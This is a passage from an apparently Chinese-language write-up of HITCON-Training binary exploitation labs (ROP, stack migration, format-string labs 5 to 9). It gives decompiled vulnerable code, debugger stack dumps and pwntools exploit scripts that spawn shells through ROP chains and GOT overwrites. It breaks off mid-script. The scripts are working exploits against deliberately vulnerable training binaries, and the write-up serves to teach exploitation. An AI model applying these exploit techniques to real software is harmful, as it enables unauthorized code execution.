class="line">0x0809a15d : mov dword ptr [edx], eax ; ret</span><br><span class="line">0x0806e829 : pop ebx ; pop edx ; ret</span><br><span class="line">0x0806e850 : pop edx ; pop ecx ; pop ebx ; ret</span><br><span class="line">0x080bae06 : pop eax ; ret</span><br><span class="line">0x080493e1 : int 0x80</span><br></pre></td></tr></table></figure></p><p>用ROPgadget用直接生成ropchain，然鹅输入长度不够，必须进行手工修改。方法一：调用read将<code>/bin/sh</code>读入bss段<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">p_eax_ret = <span class="number">0x080bae06</span></span><br><span class="line">p_edx_ecx_ebx_ret = <span class="number">0x0806e850</span></span><br><span class="line">int_80 = <span class="number">0x80493e1</span></span><br><span class="line"></span><br><span class="line">rop = <span class="string">'a'</span>*<span class="number">32</span></span><br><span class="line">rop += flat(elf.sym[<span class="string">'read'</span>], p_edx_ecx_ebx_ret, <span class="number">0</span>, elf.bss(), <span class="number">0x10</span>)</span><br><span class="line">rop += flat(p_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, elf.bss())</span><br><span class="line">rop += flat(p_eax_ret, <span class="number">0xb</span>, int_80)</span><br><span class="line"><span class="keyword">print</span> len(rop) <span class="comment"># 80</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">':'</span>,rop)</span><br><span class="line">raw_input(<span class="string">'getshell'</span>) </span><br><span class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><p>方法二，修改一下自动生成的ropchain，主要是改了后半段繁琐的rop<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">rop = <span class="string">'a'</span> * <span class="number">32</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806e82a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080bae06</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">rop += <span class="string">'/bin'</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0809a15d</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806e82a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080bae06</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">rop += <span class="string">'/sh\x00'</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0809a15d</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806e850</span>) <span class="comment"># pop edx ; pop ecx ; pop ebx ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0</span>)</span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0</span>)</span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>)</span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080bae06</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0xb</span>)</span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080493e1</span>) <span class="comment"># int 0x80</span></span><br><span class="line"><span class="keyword">print</span> len(rop) <span class="comment">#100</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">':'</span>,rop)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="lab6-migration"><a href="#lab6-migration" class="headerlink" title="lab6-migration"></a>lab6-migration</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/HITCON-Training/LAB/lab6/migration&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( count != <span class="number">1337</span> )  <span class="comment">//初始值为1337</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  ++count; </span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Try your best :"</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x40</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本题有两个限制：</p><ol><li>main只能使用一次</li><li>溢出长度只有20字节可以使用</li></ol><p>需要使用栈迁移stack privot（或者叫stack migrate），</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./migration"</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">buf = <span class="number">0x0804a000</span> + <span class="number">0x200</span></span><br><span class="line">pr = <span class="number">0x0804836d</span></span><br><span class="line">pppr = <span class="number">0x08048569</span></span><br><span class="line">leave_ret = <span class="number">0x08048504</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#d(['0x08048502'])</span></span><br><span class="line"><span class="comment"># step1: write rop1</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x28</span> + flat(buf,elf.plt[<span class="string">'read'</span>],leave_ret,<span class="number">0</span>,buf,<span class="number">0x100</span>)</span><br><span class="line">p.sendafter(<span class="string">':\n'</span>,payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"><span class="comment"># step2: leak libc.address &amp; write rop2</span></span><br><span class="line">payload = flat(buf+<span class="number">0x200</span>,elf.plt[<span class="string">'puts'</span>],pr,elf.got[<span class="string">'puts'</span>],elf.plt[<span class="string">'read'</span>],leave_ret,<span class="number">0</span>,buf+<span class="number">0x200</span>,<span class="number">0x100</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">libc.address = u32(p.recv(<span class="number">4</span>)) - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">success(<span class="string">'libc.address:&#123;:#x&#125;'</span>.format(libc.address))</span><br><span class="line"><span class="comment"># step3: getshell</span></span><br><span class="line">payload = flat(<span class="number">0xdeadbeef</span>,libc.sym[<span class="string">'system'</span>],<span class="number">0xdeadbeef</span>,next(libc.search(<span class="string">'/bin/sh\x00'</span>)))</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="lab7-crack"><a href="#lab7-crack" class="headerlink" title="lab7-crack"></a>lab7-crack</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/HITCON-Training/LAB/lab7/crack&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// ST14_4</span></span><br><span class="line">  <span class="keyword">char</span> nptr; <span class="comment">// [esp+8h] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+18h] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// [esp+7Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v3 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v3);</span><br><span class="line">  fd = open(<span class="string">"/dev/urandom"</span>, <span class="number">0</span>);</span><br><span class="line">  read(fd, &amp;password, <span class="number">4u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"What your name ? "</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x63</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Hello ,"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your password :"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;nptr, <span class="number">0xF</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( atoi(&amp;nptr) == password )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Congrt!!"</span>);</span><br><span class="line">    system(<span class="string">"cat /home/crack/flag"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Goodbyte"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最简单的格式化字符串漏洞，本题方法有三个：</p><ol><li><p>泄露<code>password</code>的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">password_addr = <span class="number">0x804A048</span></span><br><span class="line">p = process(<span class="string">'./crack'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"?"</span>, p32(password_addr) + <span class="string">"#"</span> + <span class="string">"%10$s"</span> + <span class="string">"#"</span> )</span><br><span class="line">p.recvuntil(<span class="string">"#"</span>)</span><br><span class="line">password = u32(p.recvuntil(<span class="string">"#"</span>, drop=<span class="keyword">True</span>))</span><br><span class="line">p.sendlineafter(<span class="string">":"</span>, str(password))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li><li><p>修改<code>password</code>的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">password_addr = <span class="number">0x804A048</span></span><br><span class="line">p = process(<span class="string">'./crack'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"?"</span>, fmtstr_payload(<span class="number">10</span>, &#123;password_addr: <span class="number">7</span>&#125;))</span><br><span class="line">p.sendlineafter(<span class="string">":"</span>, str(<span class="number">7</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li><li><p>修改<code>put@got</code>为<code>system(&quot;cat /home/crack/flag&quot;)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">password_addr = <span class="number">0x804A048</span></span><br><span class="line">puts_got = <span class="number">0x804A01C</span></span><br><span class="line">cat_flag = <span class="number">0x804872B</span></span><br><span class="line">p = process(<span class="string">'./crack'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"?"</span>, fmtstr_payload(<span class="number">10</span>, &#123;puts_got: cat_flag&#125;))</span><br><span class="line">p.sendlineafter(<span class="string">":"</span>, <span class="string">"show me the flag!"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><h3 id="lab8-craxme"><a href="#lab8-craxme" class="headerlink" title="lab8-craxme"></a>lab8-craxme</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/HITCON-Training/LAB/lab8/craxme&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+Ch] [ebp-10Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+10Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please crax me !"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Give me magic :"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( magic == <span class="number">0xDA</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    system(<span class="string">"cat /home/craxme/flag"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( magic == <span class="number">0xFACEB00C</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    system(<span class="string">"cat /home/craxme/craxflag"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You need be a phd"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样是格式化字符串漏洞，覆盖magic的方法不详述了，可以通过修改<code>puts@got</code>为<code>read(0, &amp;buf, 0x100u)</code>，修改<code>printf@got</code>为<code>system@plt</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p = process(<span class="string">'./craxme'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./craxme'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">":"</span>,fmtstr_payload(<span class="number">7</span>, &#123;elf.got[<span class="string">'puts'</span>]:<span class="number">0x080485A1</span>,elf.got[<span class="string">'printf'</span>]:elf.plt[<span class="string">'system'</span>]&#125;))</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="lab9-playfmt"><a href="#lab9-playfmt" class="headerlink" title="lab9-playfmt"></a>lab9-playfmt</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/HITCON-Training/LAB/lab9/playfmt&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">do_fmt</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0xC8</span>u);</span><br><span class="line">    result = <span class="built_in">strncmp</span>(buf, <span class="string">"quit"</span>, <span class="number">4u</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>字符串存在bss段，不能直接利用，需要在stack上找一对指向stack的地址以及一对指向elf.code段的（有data段更好）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ esp  0xffffd480 —▸ 0x804a060 (buf) ◂— &apos;123\n&apos;</span><br><span class="line">01:0004│      0xffffd484 —▸ 0x8048640 ◂— jno    0x80486b7 /* &apos;quit&apos; */</span><br><span class="line">02:0008│      0xffffd488 ◂— 0x4</span><br><span class="line">03:000c│      0xffffd48c —▸ 0x804857c (play+51) ◂— add    esp, 0x10</span><br><span class="line">04:0010│      0xffffd490 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d</span><br><span class="line">05:0014│      0xffffd494 —▸ 0xf7fb8000 ◂— 0x1b1db0</span><br><span class="line">06:0018│ ebp  0xffffd498 —▸ 0xffffd4a8 —▸ 0xffffd4b8 ◂— 0x0</span><br><span class="line">07:001c│      0xffffd49c —▸ 0x8048584 (play+59) ◂— nop   step3:最后指向printf@got</span><br><span class="line">08:0020│      0xffffd4a0 —▸ 0xf7fb8d60 (_IO_2_1_stdout_) ◂— 0xfbad2887</span><br><span class="line">09:0024│      0xffffd4a4 ◂— 0x0</span><br><span class="line">0a:0028│      0xffffd4a8 —▸ 0xffffd4b8 ◂— 0x0</span><br><span class="line">0b:002c│      0xffffd4ac —▸ 0x80485b1 (main+42) ◂— nop   step3:最后指向printf@got+2</span><br><span class="line">0c:0030│      0xffffd4b0 —▸ 0xf7fb83dc —▸ 0xf7fb91e0 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">12:0048│      0xffffd4c8 ◂— 0x0</span><br><span class="line">13:004c│      0xffffd4cc —▸ 0xf7e1e637 (__libc_start_main+247) ◂— add    esp, 0x10</span><br><span class="line">14:0050│      0xffffd4d0 ◂— 0x1</span><br><span class="line">15:0054│      0xffffd4d4 —▸ 0xffffd564 —▸ 0xffffd6c3 ◂— 0x6d6f682f (&apos;/hom&apos;)  step1:这个用来做跳板1</span><br><span class="line">16:0058│      0xffffd4d8 —▸ 0xffffd56c —▸ 0xffffd6ef ◂— &apos;USER=kira&apos;          step1:这个用来做跳板2</span><br><span class="line">17:005c│      0xffffd4dc ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">37:00dc│      0xffffd55c —▸ 0xf7ffd918 ◂— 0x0</span><br><span class="line">38:00e0│      0xffffd560 ◂— 0x1</span><br><span class="line">39:00e4│      0xffffd564 —▸ 0xffffd6c3 ◂— 0x6d6f682f (&apos;/hom&apos;)  step2:指向最后指向printf@got的地址</span><br><span class="line">3a:00e8│      0xffffd568 ◂— 0x0</span><br><span class="line">3b:00ec│      0xffffd56c —▸ 0xffffd6ef ◂— &apos;USER=kira&apos;          step2:指向最后指向printf@got+2的地址</span><br><span class="line">3c:00f0│      0xffffd570 —▸ 0xffffd6f9 ◂— &apos;LOGNAME=kira&apos;</span><br></pre></td></tr></table></figure></p><p>观察stack情况，挑选标记那4个地址使用<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hhn</span><span class="params">(addr,offset)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"%&#123;addr&#125;c%&#123;offset&#125;$hhn"</span>.format(addr=addr,offset=offset)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hn</span><span class="params">(addr,offset)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"%&#123;addr&#125;c%&#123;offset&#125;$hn"</span>.format(addr=addr,offset=offset)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./'</span>+target)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment">#gogogo</span></span><br><span class="line">p.send(<span class="string">'start'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'start'</span>)</span><br><span class="line"><span class="comment">#step1</span></span><br><span class="line">p.sendline(<span class="string">'%6$p..%15$p..step1\x00'</span>)</span><br><span class="line">esp_addr = int(p.recvuntil(<span class="string">'..'</span>,drop=<span class="keyword">True</span>),<span class="number">16</span>) - <span class="number">0x28</span></span><br><span class="line">success(<span class="string">'esp_addr:&#123;:#x&#125;'</span>.format(esp_addr))</span><br><span class="line">libc_start_main_247 = int(p.recvuntil(<span class="string">'..'</span>,drop=<span class="keyword">True</span>),<span class="number">16</span>)</span><br><span class="line">libc.address = libc_start_main_247 - libc.symbols[<span class="string">'__libc_start_main'</span>] - <span class="number">247</span></span><br><span class="line">success(<span class="string">'libc.address:&#123;:#x&#125;'</span>.format(libc.address))</span><br><span class="line"><span class="comment">#step2</span></span><br><span class="line">payload = hn((esp_addr+<span class="number">0x1c</span>)&amp;<span class="number">0xffff</span>,<span class="number">0x15</span>)</span><br><span class="line">payload += hn(((esp_addr+<span class="number">0x2c</span>)&amp;<span class="number">0xffff</span>-(esp_addr+<span class="number">0x1c</span>)&amp;<span class="number">0xffff</span>)%<span class="number">0xffff</span>,<span class="number">0x16</span>)</span><br><span class="line">payload += <span class="string">'step2\x00'</span></span><br><span class="line">p.sendlineafter(<span class="string">'step1'</span>,payload)</span><br><span class="line"><span class="comment">#step3</span></span><br><span class="line">payload = hn((elf.got[<span class="string">'printf'</span>])&amp;<span class="number">0xffff</span>,<span class="number">0x39</span>)</span><br><span class="line">payload += hn(<span class="number">2</span>,<span class="number">0x3b</span>)</span><br><span class="line">payload += <span class="string">'step3\x00'</span></span><br><span class="line">p.sendlineafter(<span class="string">'step2'</span>,payload)</span><br><span class="line"><span class="comment">#step4</span></span><br><span class="line"><span class="keyword">print</span> hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">payload = hhn(libc.symbols[<span class="string">'system'</span>] &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span>,<span class="number">0xb</span>)</span><br><span class="line">payload += hn((libc.symbols[<span class="string">'system'</span>]&amp;<span class="number">0xffff</span>) - (libc.symbols[<span class="string">'system'</span>] &gt;&gt; <span class="number">16</span> &amp; <span 